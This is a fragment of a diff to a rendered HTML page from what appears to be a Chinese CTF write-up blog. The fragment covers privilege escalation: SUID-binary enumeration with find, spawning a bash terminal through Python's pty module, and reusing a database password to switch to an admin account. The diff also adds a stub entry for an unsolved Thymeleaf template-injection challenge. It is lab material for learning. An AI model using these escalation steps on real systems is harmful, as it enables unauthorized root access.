 <p><img src="/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403205539855.png" alt="image-20240403205539855"></p>
-<p>环境里面没有sudo，用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查一下</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>环境里面没有sudo，用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查一下</p>
 <p>发现有<code>su</code>，不过要以终端运行</p>
 <p>之前翻文件的时候发现有python环境，可以用python起一个终端</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -417,6 +501,12 @@ admin:x:1000:1000::/home/admin:<span aria-hidden="true" class="line-numbers-rows
 <p>和蓝帽杯那题一样，发现有admin用户，拿前面数据库的密码可以成功登录，提权</p>
 <p>拿到flag</p>
 <p><img src="/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403205758850.png" alt="image-20240403205758850"></p>
+<hr>
+<h1 id="Simp1escape（Unsolved）"><a href="#Simp1escape（Unsolved）" class="headerlink" title="Simp1escape（Unsolved）"></a>Simp1escape（Unsolved）</h1><blockquote>
+<p>Thymelaef模板注入</p>
+</blockquote>
+<p>忘了搞附件了（</p>
+<p>Thymelaef模板注入：<a target="_blank" rel="noopener" href="https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89">https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89</a></p>
 
     </div>
     
